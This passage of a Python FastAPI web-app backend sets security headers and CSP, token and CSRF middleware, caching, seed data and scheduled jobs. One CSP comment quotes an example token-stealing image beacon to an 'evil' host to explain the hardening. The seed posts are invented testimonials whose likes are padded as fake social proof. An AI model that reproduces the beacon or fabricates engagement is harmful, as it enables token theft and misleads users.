from fastapi.middleware.gzip import GZipMiddleware
from starlette.datastructures import MutableHeaders

# Register font MIME types — Windows' mimetypes registry doesn't know these, so
# StaticFiles would otherwise serve the self-hosted Tabler webfont as text/plain.
import mimetypes as _mimetypes
_mimetypes.add_type("font/woff2", ".woff2")
_mimetypes.add_type("font/woff", ".woff")
_mimetypes.add_type("font/ttf", ".ttf")

app.mount("/static", StaticFiles(directory="static"), name="static")
app.mount("/css",    StaticFiles(directory="css"),    name="css")
app.mount("/js",     StaticFiles(directory="js"),     name="js")


@app.get("/favicon.ico", include_in_schema=False)
async def favicon():
    """Browsers and crawlers request /favicon.ico by default — point it at the
    Sivarr mark so the tab/search-result icon is the logo everywhere."""
    return RedirectResponse(url="/static/favicon.svg", status_code=302)

_cors_origins = list({o.strip() for o in [
    BASE_URL.rstrip('/'),
    "https://sivarr.up.railway.app",
    "https://sivarr.com",
] if o.strip()})
app.add_middleware(
    CORSMiddleware,
    allow_origins=_cors_origins,
    allow_methods=["GET", "POST", "PUT", "DELETE", "OPTIONS"],
    allow_headers=["Authorization", "Content-Type"],
    allow_credentials=False,
)

# Compress responses >= 1 KB — critical for 602 KB app.js / 262 KB styles.css
app.add_middleware(GZipMiddleware, minimum_size=1000)

# Long-lived cache headers for versioned static assets (CSS/JS/static)
#
# Pure-ASGI (not BaseHTTPMiddleware) is deliberate: BaseHTTPMiddleware pumps the
# response through a background task + memory stream, and when a client disconnects
# mid-stream on a StreamingResponse (our SSE chat/announcement endpoints, which hold
# the connection open for minutes) that task can be cancelled before it ever emits
# "http.response.start", which surfaces to Starlette as `RuntimeError: No response
# returned.` — seen repeatedly in Sentry on /api/org/chat/stream. Pure-ASGI middleware
# just wraps send() and forwards messages through untouched, so it can't trigger it.
class _StaticCacheMiddleware:
    def __init__(self, app):
        self.app = app

    async def __call__(self, scope, receive, send):
        if scope.get("type") != "http":
            await self.app(scope, receive, send)
            return
        path = scope.get("path", "")
        cacheable = path.startswith(("/css/", "/js/", "/static/"))
        # Only a URL carrying a content hash may be cached immutably — that is what
        # makes the hash safe to trust. An unversioned URL (a reference from inside a
        # CSS or JS file, which cannot call asset()) gets a short revalidating TTL
        # instead, so it can still be updated. Previously EVERY path under these
        # prefixes was pinned for a year regardless, which is how js/features/*.js
        # and css/features/*.css ended up permanently uncacheable-bustable, and how a
        # stale hardcoded ?v= in panels.css could pin an old logo forever.
        versioned = b"v=" in scope.get("query_string", b"")

        async def send_wrapper(message):
            if cacheable and message["type"] == "http.response.start":
                MutableHeaders(scope=message)["Cache-Control"] = (
                    "public, max-age=31536000, immutable" if versioned
                    else "public, max-age=300, must-revalidate"
                )
            await send(message)

        await self.app(scope, receive, send_wrapper)

app.add_middleware(_StaticCacheMiddleware)

# Security headers on every response (pure-ASGI — see _StaticCacheMiddleware above)
class _SecurityHeadersMiddleware:
    # NOTE on script-src 'unsafe-inline': the app currently relies on ~1000+ inline
    # event handlers (onclick=, …) and inline <script> blocks, so 'unsafe-inline'
    # cannot be removed without migrating all of them to addEventListener/delegation
    # (a large, separate effort). Until then we harden the *exfiltration* side so an
    # injected script cannot ship a stolen token out: connect-src is locked to known
    # APIs (blocks fetch/XHR/beacon exfil), img-src no longer allows arbitrary https:
    # (blocks `new Image().src='https://evil/?t='+token` beacons), and object-src
    # 'none' kills <object>/<embed> script vectors.
    _CSP = (
        "default-src 'self'; "
        "script-src 'self' 'unsafe-inline' https://plausible.io "
        "  https://js.sentry-cdn.com https://browser.sentry-cdn.com; "
        # worker-src must be explicit: without it, Workers fall back to script-src
        # (no blob:) and Sentry session-replay's blob Worker is CSP-blocked. Allow
        # same-origin + blob workers only; connect-src still constrains their exfil.
        "worker-src 'self' blob:; "
        # The app self-hosts its font, but landing/legal/admin/lecturer pages still
        # load Google Fonts and share this global CSP — keep these origins until those
        # pages are migrated too (then both can drop to 'self').
        "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; "
        "font-src 'self' https://fonts.gstatic.com; "
        "img-src 'self' data: blob:; "
        "media-src 'self' blob:; "
        "object-src 'none'; "
        "connect-src 'self' https://plausible.io https://*.ingest.sentry.io https://*.ingest.us.sentry.io "
        "  https://api.paystack.co https://api.flutterwave.com https://api.withmono.com "
        "  https://accounts.google.com https://api.github.com; "
        "frame-src 'self' https://js.paystack.co https://checkout.flutterwave.com; "
        "frame-ancestors 'none'; "
        "base-uri 'self'; "
        "form-action 'self';"
    )
    # Same policy but allowing same-origin framing — for the Templates library
    # preview iframes (served from /static/templates/). They must NOT be DENY'd.
    _CSP_FRAME_SELF = _CSP.replace("frame-ancestors 'none'", "frame-ancestors 'self'")

    def __init__(self, app):
        self.app = app

    async def __call__(self, scope, receive, send):
        if scope.get("type") != "http":
            await self.app(scope, receive, send)
            return
        path = scope.get("path", "")
        # /static/templates/ → Templates-library previews.
        # "/" and "/app" → same-origin device-preview harness (static/devices.html).
        # SAMEORIGIN still blocks cross-origin clickjacking (only sivarr.com can frame).
        framable = path.startswith("/static/templates/") or path in ("/", "/app")
        is_https = any(
            k == b"x-forwarded-proto" and v == b"https"
            for k, v in scope.get("headers", [])
        )

        async def send_wrapper(message):
            if message["type"] == "http.response.start":
                h = MutableHeaders(scope=message)
                h["X-Frame-Options"]         = "SAMEORIGIN" if framable else "DENY"
                h["X-Content-Type-Options"]  = "nosniff"
                h["Referrer-Policy"]         = "strict-origin-when-cross-origin"
                h["Permissions-Policy"]      = "camera=(), microphone=(), geolocation=()"
                h["Content-Security-Policy"] = self._CSP_FRAME_SELF if framable else self._CSP
                # Only send HSTS over HTTPS (Railway always proxies via HTTPS)
                if is_https:
                    h["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"
            await send(message)

        await self.app(scope, receive, send_wrapper)

app.add_middleware(_SecurityHeadersMiddleware)

# Accept the session token from the `Authorization: Bearer` header and inject it
# into the query string, so the existing ~64 `token` query-param endpoints read it
# WITHOUT the token ever appearing in the URL (logs / proxy logs / Referer / history).
# The query param still works as a fallback during migration. SSE/EventSource keeps
# using a query param for now (moves to cookie auth in the P3(b) sprint).
import urllib.parse as _urlparse
from http.cookies import SimpleCookie as _SimpleCookie
class _BearerTokenMiddleware:
    """Pure-ASGI token resolver. Precedence: explicit ?token= query > Authorization
    Bearer header > httpOnly session cookie. The resolved token is (1) stashed in
    the `_req_token` ContextVar so body-token endpoints can authenticate from the
    cookie, and (2) injected into the query string so query-param endpoints and
    SSE/EventSource work without ?token= in the URL.

    Pure-ASGI (not BaseHTTPMiddleware) is deliberate: it sets the ContextVar in the
    request's own task before calling downstream, so the value propagates to the
    endpoint (BaseHTTPMiddleware does not reliably propagate ContextVars set in
    dispatch). Fully additive — the body token and ?token= query still work."""
    def __init__(self, app):
        self.app = app

    async def __call__(self, scope, receive, send):
        if scope.get("type") != "http":
            await self.app(scope, receive, send)
            return
        qs = scope.get("query_string", b"")
        # Existing ?token= in the query takes precedence (and means no injection).
        q_token, has_token = "", False
        try:
            parsed = _urlparse.parse_qs(qs.decode("latin-1"))
            if "token" in parsed:
                has_token = True
                q_token = parsed["token"][0] if parsed["token"] else ""
        except Exception:
            has_token = b"token=" in qs
        tok = q_token
        if not tok:
            for k, v in scope.get("headers", []):
                if k == b"authorization":
                    av = v.decode("latin-1")
                    if av[:7].lower() == "bearer ":
                        tok = av[7:].strip()
                    break
        csrf_cookie = ""
        if not tok:
            for k, v in scope.get("headers", []):
                if k == b"cookie":
                    try:
                        c = _SimpleCookie(); c.load(v.decode("latin-1"))
                        if _SESSION_COOKIE_KEY in c:
                            tok = c[_SESSION_COOKIE_KEY].value
                        if _CSRF_COOKIE in c:
                            csrf_cookie = c[_CSRF_COOKIE].value
                    except Exception:
                        pass
                    break
        else:
            # Token was found in query or Bearer header — still read CSRF cookie
            for k, v in scope.get("headers", []):
                if k == b"cookie":
                    try:
                        c = _SimpleCookie(); c.load(v.decode("latin-1"))
                        if _CSRF_COOKIE in c:
                            csrf_cookie = c[_CSRF_COOKIE].value
                    except Exception:
                        pass
                    break
        # CSRF double-submit validation: state-mutating requests with a session that
        # already has a CSRF cookie must echo it as X-CSRF-Token. Requests without the
        # CSRF cookie (old sessions, grace period) are let through with a warning.
        method = scope.get("method", "GET")
        if method in ("POST", "PUT", "DELETE", "PATCH"):
            path = scope.get("path", "")
            _csrf_exempt = (
                path in ("/api/login", "/api/admin/login", "/api/lecturer/login")
                or path.startswith("/api/auth/")
            )
            if not _csrf_exempt and tok and csrf_cookie:
                csrf_header = ""
                for k, v in scope.get("headers", []):
                    if k == b"x-csrf-token":
                        csrf_header = v.decode("latin-1", "replace").strip()
                        break
                if not hmac.compare_digest(csrf_header or "", csrf_cookie):
                    _b = b'{"detail":"Request blocked - please refresh the page."}'
                    _h = [(b"content-type", b"application/json"), (b"content-length", str(len(_b)).encode())]
                    await send({"type": "http.response.start", "status": 403, "headers": _h})
                    await send({"type": "http.response.body", "body": _b})
                    return
        reset = _req_token.set(tok or "")
        try:
            if tok and not has_token:
                add = b"token=" + _urlparse.quote(tok, safe="").encode()
                scope["query_string"] = (qs + b"&" + add) if qs else add
            await self.app(scope, receive, send)
        finally:
            _req_token.reset(reset)

app.add_middleware(_BearerTokenMiddleware)

# ── Per-worker in-memory response cache with TTL ─────────────────
_rcache: dict[str, tuple] = {}  # key → (payload, expires_at)

def _rc_get(key: str):
    # Redis when available (shared across workers/instances); else per-worker memory.
    if rcache.available():
        return rcache.cache_get(key)
    entry = _rcache.get(key)
    if entry and time.time() < entry[1]:
        return entry[0]
    _rcache.pop(key, None)
    return None

def _rc_set(key: str, value, ttl: int = 60) -> None:
    if rcache.available():
        rcache.cache_set(key, value, ttl)
        return
    _rcache[key] = (value, time.time() + ttl)

def _rc_bust(prefix: str) -> None:
    if rcache.available():
        rcache.cache_bust(prefix)
        return
    for k in list(_rcache):
        if k.startswith(prefix):
            _rcache.pop(k, None)


@app.on_event("startup")
async def startup():
    import asyncio
    limiter._set_path(DATA_DIR / "rate_limits.json")

    # ── Everything runs in the background so workers bind to the port
    # immediately and Railway's /health check passes in milliseconds.
    async def _full_startup():
        # DB init — retry up to 3 times with a short sleep between attempts
        if db.is_available():
            ok = False
            for attempt in range(3):
                try:
                    # init_db is blocking psycopg2 (69 DDL round-trips, ~40s when the
                    # DB is reachable). Run it in a thread so the worker's event loop
                    # stays free and /health responds in ms instead of freezing for
                    # the whole schema init (which was timing out Railway's check).
                    ok = await asyncio.to_thread(db.init_db)
                except Exception as e:
                    log.warning(f"DB init attempt {attempt + 1} exception: {e}")
                if ok:
                    break
                log.warning(f"DB init attempt {attempt + 1} failed — retrying in 2s…")
                await asyncio.sleep(2)
            if ok:
                try:
                    await asyncio.to_thread(db.migrate_from_json, str(USERS_PATH), str(DATA_DIR))
                    await asyncio.to_thread(db.cleanup_db_sessions)
                    await asyncio.to_thread(db.seed_marketplace_templates)
                except Exception as e:
                    log.warning(f"DB post-init step failed: {e}")
                log.info("Database ready")
            else:
                log.error("DB schema init failed — org features may be unavailable")
        else:
            log.info("Running on JSON file storage (no DATABASE_URL set)")

        # Demo/seed community posts + opportunities — intentionally disabled
        # 2026-08 (Hunter, approaching launch): Sivarr uses real data only from
        # here on, Feed and Opportunities should start genuinely empty for a
        # fresh install. _seed_community_and_opps()/_SEED_POSTS/_SEED_OPPS are
        # left in place (not deleted) in case a demo/staging environment wants
        # them later — just no longer called automatically on every boot.
        # NOTE: this only stops *new* fake rows going forward — it does not
        # retroactively delete any already inserted into a live database by
        # an earlier boot. That needs a manual cleanup pass against the real
        # DB (delete rows with id starting "opp_"/matching _SEED_POSTS ids),
        # which isn't something to run from here without direct prod access.

        # APScheduler — jobs for weekly review + push notifications
        try:
            _start_scheduler()
        except Exception as exc:
            log.warning(f"Scheduler start skipped: {exc}")

        # Email configuration status
        if GMAIL_USER and GMAIL_APP_PASSWORD:
            log.info(f"Email: Gmail SMTP ready. from={GMAIL_USER}")
        elif RESEND_API_KEY:
            log.info(f"Email: Resend ready. from={RESEND_FROM}")
        else:
            log.error("Email: no provider configured — set GMAIL_USER + GMAIL_APP_PASSWORD in Railway Variables")

        # Periodic rate-limit cleanup (runs forever)
        async def _cleanup_rate_hits():
            while True:
                await asyncio.sleep(600)
                if db.is_available():
                    try:
                        await asyncio.to_thread(db.prune_rate_limit_hits, RATE_LIMIT_WINDOW * 10)
                    except Exception as exc:
                        log.warning(f"rate_limit_hits cleanup error: {exc}")
        asyncio.create_task(_cleanup_rate_hits())

    asyncio.create_task(_full_startup())

# ═══════════════════════════════════════════════════════════════
#  MP4 — Seed community posts + opportunities (DB-backed, JSON fallback)
# ═══════════════════════════════════════════════════════════════

_SEED_POSTS = [
    # Nigerian-context seed posts (newest first). `likes` is a count — the seeder
    # expands it into a JSONB array of placeholder sids so the feed shows real
    # social proof; a real user's like appends on top of that base.
    {"id": "seed_n01", "author": "Chidi Okeke", "category": "general", "likes": 14, "tags": ["habits", "journaling"],
     "content": "Just hit 30 days of consistent journaling on Sivarr 🔥 The weekly AI review is genuinely changing how I reflect. Anyone else using the weekly review feature?"},
    {"id": "seed_n02", "author": "Amara Nwosu", "category": "career", "likes": 27, "tags": ["opportunities", "remote-work"],
     "content": "For anyone building in public from Lagos, the Opportunities board just dropped new remote roles from EU companies open to Nigerian applicants. Go check it. 🇳🇬"},
    {"id": "seed_n03", "author": "Tunde Fashola", "category": "general", "likes": 42, "tags": ["productivity", "africa"],
     "content": "Hot take: the problem with Nigerian productivity isn't motivation, it's systems. Most of us never had access to proper tools that fit our context. Sivarr is the first thing that feels like it was built for us."},
    {"id": "seed_n04", "author": "Ngozi Adeyemi", "category": "qa", "likes": 9, "tags": ["spaces", "workflow"],
     "content": "Question for the community: how are you all using the Spaces feature? I've set up a Personal space for my freelance work and an Org space for my agency. What's your setup?"},
    {"id": "seed_n05", "author": "Emeka Chibueze", "category": "general", "likes": 19, "tags": ["agents", "nysc"],
     "content": "Reminder: the Agents marketplace is live. I built a 'Daily NYSC Task Planner' and published it last week. Zero setup, just add it to your workspace."},
    {"id": "seed_n06", "author": "Fatima Bello", "category": "career", "likes": 31, "tags": ["freelance", "goals"],
     "content": "Three months in and I've closed 2 freelance clients using the Goals tracker to manage my pipeline. The Kanban board in the Org space is actually 🔥 for solo consultants."},
    {"id": "seed_n07", "author": "Ade Williams", "category": "general", "likes": 38, "tags": ["offline", "nigeria"],
     "content": "PSA: Sivarr works offline. Was in Abuja with terrible network last week and my tasks, notes and journal all synced when I got back to Lagos. Underrated for the Nigerian context."},
    {"id": "seed_n08", "author": "Kemi Olatunji", "category": "study", "likes": 22, "tags": ["agents", "education"],
     "content": "Shipped my first Sivarr agent today 🎉 A 'JAMB Study Planner' that breaks down any subject into a 60-day schedule. Free to use. Creators really do earn 90% on this platform which is wild."},
    {"id": "seed_n09", "author": "Ibrahim Musa", "category": "general", "likes": 16, "tags": ["ai-brief", "habits"],
     "content": "The daily AI brief has become my morning ritual. Wake up, open Sivarr, read the brief, know exactly what to focus on. It's replaced 3 separate apps for me."},
    {"id": "seed_n10", "author": "Zainab Audu", "category": "general", "likes": 25, "tags": ["goals", "accountability"],
     "content": "Anyone else find that setting a weekly goal and reviewing it on Monday morning is the most accountability you've ever had? No external coach needed when the AI review is this good."},
    # ── original generic seeds (kept — extend, don't replace) ──
    {"id": "seed_1", "author": "Sivarr Team", "content": "Just launched my first feature after two weeks of debugging. Celebrate the small wins.", "category": "general"},
    {"id": "seed_2", "author": "Sivarr Team", "content": "Anyone else use Sivarr AI for breaking down big projects? The task extraction is underrated.", "category": "qa"},
    {"id": "seed_3", "author": "Sivarr Team", "content": "Tip: link your tasks to goals in the detail panel. Your weekly review gets way more useful.", "category": "general"},
    {"id": "seed_4", "author": "Sivarr Team", "content": "Built a study routine using the Pomodoro timer and daily plan combo. 3 weeks consistent.", "category": "study"},
    {"id": "seed_5", "author": "Sivarr Team", "content": "For Nigerian founders: Paystack webhooks + Sivarr Financials tab is a clean combo for tracking MRR.", "category": "general"},
]

_SEED_OPPS = [
    {"id": "opp_1", "title": "Frontend Developer (Remote)", "description": "Build interfaces for a Lagos-based fintech. 2+ years React required.", "category": "job", "organisation": "PaystackHQ", "location": "Remote / Lagos", "deadline": "", "url": "#"},
    {"id": "opp_2", "title": "Google Africa Developer Scholarship", "description": "Scholarship for African developers to upskill in cloud and mobile development.", "category": "scholarship", "organisation": "Google", "location": "Africa-wide", "deadline": "", "url": "#"},
    {"id": "opp_3", "title": "Tony Elumelu Foundation Grant", "description": "₦5M grant for early-stage African entrepreneurs. Applications open now.", "category": "grant", "organisation": "TEF", "location": "Africa-wide", "deadline": "", "url": "#"},
    {"id": "opp_4", "title": "UI/UX Design Internship", "description": "3-month paid internship at a product studio in Yaba, Lagos. Stipend provided.", "category": "internship", "organisation": "Studio Yaba", "location": "Lagos, Nigeria", "deadline": "", "url": "#"},
    {"id": "opp_5", "title": "Binance Africa Web3 Hackathon", "description": "Build on-chain tools for African markets. Prizes up to $50,000.", "category": "grant", "organisation": "Binance", "location": "Remote", "deadline": "", "url": "#"},
    # ── Sprint C: Nigerian-context listings. Pay is folded into the description
    # because the opportunities schema has no salary column. ──
    {"id": "opp_001", "title": "Senior Backend Engineer (Remote)", "category": "job", "organisation": "Andela", "location": "Remote (Open to Nigeria)", "deadline": "2026-07-15", "url": "#",
     "description": "Build scalable microservices for global tech clients. Python/Go experience required. Pay: ₦800,000 – ₦1,200,000/month."},
    {"id": "opp_002", "title": "ALX Africa Tech Scholarship 2026", "category": "scholarship", "organisation": "ALX Africa", "location": "Online", "deadline": "2026-07-01", "url": "#",
     "description": "12-month software engineering program. No prior experience required. Nigerian applicants encouraged. Full scholarship, ₦0 tuition."},
    {"id": "opp_003", "title": "Product Design Intern", "category": "internship", "organisation": "Flutterwave", "location": "Lagos, Nigeria (Hybrid)", "deadline": "2026-06-30", "url": "#",
     "description": "6-month internship with Nigeria's leading fintech. Figma skills required. Stipend: ₦150,000/month."},
    {"id": "opp_004", "title": "Data Analyst (Growth Team)", "category": "job", "organisation": "Paystack", "location": "Lagos, Nigeria", "deadline": "2026-07-20", "url": "#",
     "description": "Drive growth insights using SQL and Python. Help scale Africa's leading payment stack. Pay: ₦500,000 – ₦700,000/month."},
    {"id": "opp_005", "title": "Google Africa Developer Scholarship", "category": "scholarship", "organisation": "Google / Pluralsight", "location": "Online", "deadline": "2026-08-01", "url": "#",
     "description": "Mobile Web Specialist or Android Developer tracks. Open to all Nigerians 18+. Full scholarship."},
    {"id": "opp_006", "title": "Technical Content Writer (Remote)", "category": "job", "organisation": "Hashnode", "location": "Remote (Global)", "deadline": "Rolling", "url": "#",
     "description": "Write in-depth technical tutorials on web development, AI, or DevOps. Nigerian writers welcome. Pay: $500 – $800/article."},
    {"id": "opp_007", "title": "Business Development Intern", "category": "internship", "organisation": "Cowrywise", "location": "Lagos, Nigeria", "deadline": "2026-07-10", "url": "#",
     "description": "Support the BD team in growing Cowrywise's B2B partnerships across Nigeria. Stipend: ₦120,000/month."},
    {"id": "opp_008", "title": "Tony Elumelu Foundation Entrepreneurship Programme", "category": "grant", "organisation": "TEF", "location": "Pan-Africa", "deadline": "2026-09-01", "url": "#",
     "description": "Annual programme for African entrepreneurs. Includes seed capital, mentorship, and training. $5,000 seed funding + mentorship."},
    {"id": "opp_009", "title": "DevOps / Cloud Engineer", "category": "job", "organisation": "Kuda Bank", "location": "Lagos, Nigeria (Hybrid)", "deadline": "2026-07-25", "url": "#",
     "description": "AWS-focused DevOps role at Nigeria's leading digital bank. Kubernetes and Terraform preferred. Pay: ₦600,000 – ₦900,000/month."},
    {"id": "opp_010", "title": "Software Engineering Intern (Mobile)", "category": "internship", "organisation": "Interswitch", "location": "Lagos, Nigeria", "deadline": "2026-07-05", "url": "#",
     "description": "Work on mobile banking SDKs used by millions of Nigerians. React Native or Flutter a plus. Stipend: ₦100,000/month."},
    {"id": "opp_011", "title": "UI/UX Designer (Consumer Products)", "category": "job", "organisation": "OPay", "location": "Lagos, Nigeria", "deadline": "2026-08-15", "url": "#",
     "description": "Design digital financial products for 30M+ Nigerian users. Portfolio required. Pay: ₦450,000 – ₦650,000/month."},
    {"id": "opp_012", "title": "Access Bank Women in Tech Scholarship", "category": "scholarship", "organisation": "Access Bank + CcHUB", "location": "Lagos + Online", "deadline": "2026-07-31", "url": "#",
     "description": "12-week intensive training for women in software development. No prior coding experience required. Full funding + ₦50,000/month stipend."},
    {"id": "opp_013", "title": "AI / ML Engineer (Remote-first)", "category": "job", "organisation": "Recursion (African Hub)", "location": "Remote (Nigeria preferred)", "deadline": "2026-08-01", "url": "#",
     "description": "Work on drug-discovery ML models. Python, PyTorch, and bioinformatics background useful. Pay: $2,000 – $3,500/month."},
    {"id": "opp_014", "title": "Marketing & Growth Intern", "category": "internship", "organisation": "Piggyvest", "location": "Lagos, Nigeria", "deadline": "2026-06-28", "url": "#",
     "description": "Support growth and brand marketing at Nigeria's #1 personal finance app. Ideal for marketing students. Stipend: ₦90,000/month."},
    {"id": "opp_015", "title": "MTN Nigeria Digital Skills Fund", "category": "scholarship", "organisation": "MTN Foundation", "location": "Online", "deadline": "Rolling", "url": "#",
     "description": "Data science, cybersecurity, and cloud computing tracks. Available to 18–35 year olds across Nigeria. Full scholarship, ₦0 cost."},
]

def _seed_post_to_storage(p, idx):
    """Convert a _SEED_POSTS entry into the shape the API/frontend expect:
    `body` (not `content`), `likes`/`replies` as arrays, ISO `created`."""
    n = int(p.get("likes", 0) or 0)
    created = datetime.datetime.utcnow() - datetime.timedelta(hours=idx * 2)
    return {
        "id": p["id"], "author": p.get("author", "Sivarr Team"), "sid": "",
        "body": p.get("content", p.get("body", "")),
        "category": p.get("category", "general"),
        "tags": p.get("tags", []),
        "likes": [f"seed_{p['id']}_{j}" for j in range(n)],
        "replies": [],
        "created": created.strftime("%Y-%m-%dT%H:%M:%SZ"),
    }


def _seed_opp_to_storage(o):
    """Convert a _SEED_OPPS entry into the render shape (`desc`, `link`)."""
    return {
        "id": o["id"], "title": o["title"], "desc": o.get("description", ""),
        "link": o.get("url", o.get("link", "")), "category": o.get("category", "other"),
        "organisation": o.get("organisation", ""), "location": o.get("location", ""),
        "deadline": o.get("deadline", ""), "submitted_by": "",
        "created": datetime.datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ"),
    }


def _seed_community_and_opps():
    """Seed community posts and opportunities into the DB (or JSON fallback)."""
    if db.is_available():
        db.seed_community_posts(_SEED_POSTS)
        db.seed_opportunities(_SEED_OPPS)
        log.info("Community/opportunities seed check complete (DB)")
        return
    # JSON fallback (no DB) — store in the render-ready shape
    with _comm_lock:
        posts = _load_json_file(COMMUNITY_PATH, [])
    if not posts:
        with _comm_lock:
            _save_json_file(COMMUNITY_PATH, [_seed_post_to_storage(p, i) for i, p in enumerate(_SEED_POSTS)])
        log.info("Seeded community posts (JSON)")
    with _opp_lock:
        opps = _load_json_file(OPPORTUNITIES_PATH, [])
    if not opps:
        with _opp_lock:
            _save_json_file(OPPORTUNITIES_PATH, [_seed_opp_to_storage(o) for o in _SEED_OPPS])
        log.info("Seeded opportunities (JSON)")


# ═══════════════════════════════════════════════════════════════
#  MP5 — Push notification backend (subscribe + send)
# ═══════════════════════════════════════════════════════════════

_PUSH_SUBS_PATH = DATA_DIR / "push_subscriptions.json"
_push_lock = threading.Lock()

def _load_push_subs() -> dict:
    with _push_lock:
        return _load_json_file(_PUSH_SUBS_PATH, {})

def _save_push_subs(subs: dict):
    with _push_lock:
        _save_json_file(_PUSH_SUBS_PATH, subs)

def _send_push(subscription_info: dict, title: str, body: str, url: str = "/app") -> str:
    """Send a web push notification. Returns 'expired' if subscription is stale."""
    if not WEBPUSH_AVAILABLE or not VAPID_PRIVATE_KEY or not VAPID_PUBLIC_KEY:
        return "unavailable"
    try:
        _webpush(
            subscription_info=subscription_info,
            data=json.dumps({"title": title, "body": body, "url": url}),
            vapid_private_key=VAPID_PRIVATE_KEY,
            vapid_claims={"sub": VAPID_EMAIL},
        )
        return "ok"
    except WebPushException as e:
        if e.response and e.response.status_code in (404, 410):
            return "expired"
        log.warning(f"Push failed: {e}")
        return "error"
    except Exception as e:
        log.warning(f"Push error: {e}")
        return "error"

@app.post("/api/notifications/subscribe")
async def push_subscribe(data: dict):
    """Store a browser push subscription for a user."""
    token = data.get("token", "")
    sess  = get_session_from_token(token)
    if not sess:
        raise HTTPException(401, "Invalid session.")
    sid          = sess["sid"]
    subscription = data.get("subscription")
    notif_type   = data.get("type", "")
    if not subscription or notif_type not in ("streak", "tasks"):
        raise HTTPException(400, "Missing subscription or invalid type.")
    subs = _load_push_subs()
    entry = subs.get(sid, {"subscription": subscription, "types": []})
    entry["subscription"] = subscription
    if notif_type not in entry["types"]:
        entry["types"].append(notif_type)
    subs[sid] = entry
    _save_push_subs(subs)
    return {"status": "subscribed"}

@app.post("/api/notifications/unsubscribe")
async def push_unsubscribe(data: dict):
    """Remove a notification type from a user's subscription."""
    token = data.get("token", "")
    sess  = get_session_from_token(token)
    if not sess:
        raise HTTPException(401, "Invalid session.")
    sid        = sess["sid"]
    notif_type = data.get("type", "")
    subs = _load_push_subs()
    if sid in subs:
        subs[sid]["types"] = [t for t in subs[sid].get("types", []) if t != notif_type]
        if not subs[sid]["types"]:
            del subs[sid]
    _save_push_subs(subs)
    return {"status": "unsubscribed"}


# ═══════════════════════════════════════════════════════════════
#  MP6 — APScheduler: weekly review + push notification jobs
# ═══════════════════════════════════════════════════════════════

def _start_scheduler():
    """Initialise and start APScheduler with weekly review and push notification jobs."""
    try:
        from apscheduler.schedulers.asyncio import AsyncIOScheduler
        from apscheduler.triggers.cron import CronTrigger
        from apscheduler.triggers.interval import IntervalTrigger
    except ImportError:
        log.warning("APScheduler not installed — scheduled jobs disabled.")
        return

    # ── Define job coroutines ─────────────────────────────────────

    async def _auto_weekly_reviews():
        import datetime as _dt
        log.info("Running auto weekly review job…")
        today       = _dt.date.today()
        week_start  = str(today - _dt.timedelta(days=today.weekday()))
        reviews_dir = DATA_DIR / "weekly_reviews"
        reviews_dir.mkdir(exist_ok=True)
        for p in DATA_DIR.glob("*_habits.json"):
            sid = p.name.replace("_habits.json", "")
            review_path = reviews_dir / f"{sid}_{week_start}.json"
            if review_path.exists():
                continue
            tasks      = load_tasks(sid)
            habits     = load_habits(sid)
            goals      = load_goals(sid)
            tasks_done = sum(1 for t in tasks if t.get("done"))
            habit_logs = sum(len(h.get("completions", [])) for h in habits)
            if tasks_done < 3 and habit_logs < 5:
                continue
            habits_pct = 0
            if habits:
                days_range = [str(today - _dt.timedelta(days=i)) for i in range(7)]
                done_logs  = sum(1 for h in habits for d in h.get("completions", []) if d in days_range)
                habits_pct = round(done_logs / (len(habits) * 7) * 100)
            mood = ""
            jnl_path = DATA_DIR / f"{sid}_journal.json"
            if jnl_path.exists():
                try:
                    jnl   = json.loads(jnl_path.read_text(encoding="utf-8"))
                    moods = [e.get("mood", "") for e in jnl
                             if e.get("date", "") >= str(today - _dt.timedelta(days=7)) and e.get("mood")]
                    if moods:
                        from collections import Counter as _Counter
                        mood = _Counter(moods).most_common(1)[0][0]
                except Exception:
                    pass
            goals_txt  = "\n".join(f"  - {g.get('title','')}: {g.get('progress',0)}%" for g in goals[:5]) or "  - No active goals"
            week_range = f"{(today - _dt.timedelta(days=6)).strftime('%b %d')}–{today.strftime('%b %d')}"
            prompt = (f"Write a warm, insightful weekly review covering {week_range}.\n"
                      f"Tasks completed: {tasks_done}/{len(tasks)}. Habits: {habits_pct}%. Goals:\n{goals_txt}.\n"
                      f"{'Mood: ' + mood + '.' if mood else ''}\n"
                      f"4 sections: **This Week**, **Wins**, **Focus Next Week**, **Closing**. Max 300 words.")
            try:
                review = gemini_once(prompt, temp=0.72, tokens=380)
                if review:
                    save_json(review_path, {"review": review, "week_start": week_start,
                                            "generated_at": today.isoformat()})
                    log.info(f"Auto weekly review saved for {sid}")
            except Exception as e:
                log.error(f"Auto review failed for {sid}: {e}")

    async def _streak_reminders():
        import datetime as _dt
        today_str = str(_dt.date.today())
        subs = _load_push_subs()
        for sid, entry in list(subs.items()):
            if "streak" not in entry.get("types", []):
                continue
            habits    = load_habits(sid)
            unchecked = [h for h in habits if today_str not in h.get("completions", [])]
            if not unchecked:
                continue
            result = _send_push(entry["subscription"],
                                title="Sivarr · Streak at risk",
                                body="Log your habits before midnight to keep your streak.",
                                url="/app#habits")
            if result == "expired":
                subs.pop(sid, None)
        _save_push_subs(subs)

    async def _task_due_alerts():
        import datetime as _dt
        now       = _dt.datetime.utcnow()
        window    = str((now + _dt.timedelta(minutes=75)).date())
        today_str = str(now.date())
        subs = _load_push_subs()
        for sid, entry in list(subs.items()):
            if "tasks" not in entry.get("types", []):
                continue
            tasks = load_tasks(sid)
            for t in tasks:
                if t.get("done"):
                    continue
                due = t.get("date", "")
                if not due or not (today_str <= due <= window):
                    continue
                if t.get("push_notified_at", "") >= today_str:
                    continue
                result = _send_push(entry["subscription"],
                                    title=f"Due soon: {t.get('title','Task')}",
                                    body="This task is due in under an hour.",
                                    url="/app#tasks")
                if result == "ok":
                    t["push_notified_at"] = today_str
                elif result == "expired":
                    subs.pop(sid, None)
                    break
            else:
                save_tasks(sid, tasks)
        _save_push_subs(subs)

    async def _purge_deleted_goals():
        """Permanently remove goals that have sat in Trash past the 30-day
        retention window (soft delete lands in routes/goals.py's delete_goal).
        Sweeps both storage backends explicitly — a JSON-file-only glob (like
        the pre-existing pattern in _auto_weekly_reviews above) would silently
        purge nothing for any user once a database is configured, since
        _load_user_list/_save_user_list stop writing per-user JSON files the
        moment db.is_available() is true."""
        import datetime as _dt
        cutoff = _dt.datetime.utcnow() - _dt.timedelta(days=30)
